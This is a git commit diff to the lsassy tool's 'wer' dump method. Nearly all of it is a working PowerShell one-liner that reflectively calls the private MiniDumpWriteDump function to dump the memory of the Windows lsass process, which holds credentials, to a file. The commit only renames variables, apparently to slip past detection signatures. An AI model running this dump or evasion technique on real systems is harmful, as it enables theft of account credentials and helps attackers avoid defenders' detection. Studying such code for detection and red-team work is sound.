3f0c9feafe92191fb87d037c83333f9627184a80
pixis <hackndo@gmail.com>
2025-06-25 17:03:32 +0200

    Update wer

--- lsassy/dumpmethod/wer.py
+++ lsassy/dumpmethod/wer.py
@@ -8,7 +8,9 @@ from lsassy.dumpmethod import IDumpMethod
 
 class DumpMethod(IDumpMethod):
     def get_commands(self):
-        pwsh_command = """$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$ProcessDumpPath = '{}{}';$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create);$p=Get-Process lsass;$Result = $MiniDumpWriteDump.Invoke($null, @($p.Handle,$p.Id,$FileStream.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$FileStream.Close()""".format(
+        pwsh_command = """$PL = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $PL.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MDWD = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$ProcessDumpPath = '{}{}';$FS = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create);$p=Get-Process lsass;$Result = $MDWD.Invoke($null, @($p.Handle,$p.Id,$FS.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$FS.Close()""".format(
             self.dump_path, self.dump_name
         )
         return {"cmd": None, "pwsh": pwsh_command}
+
+
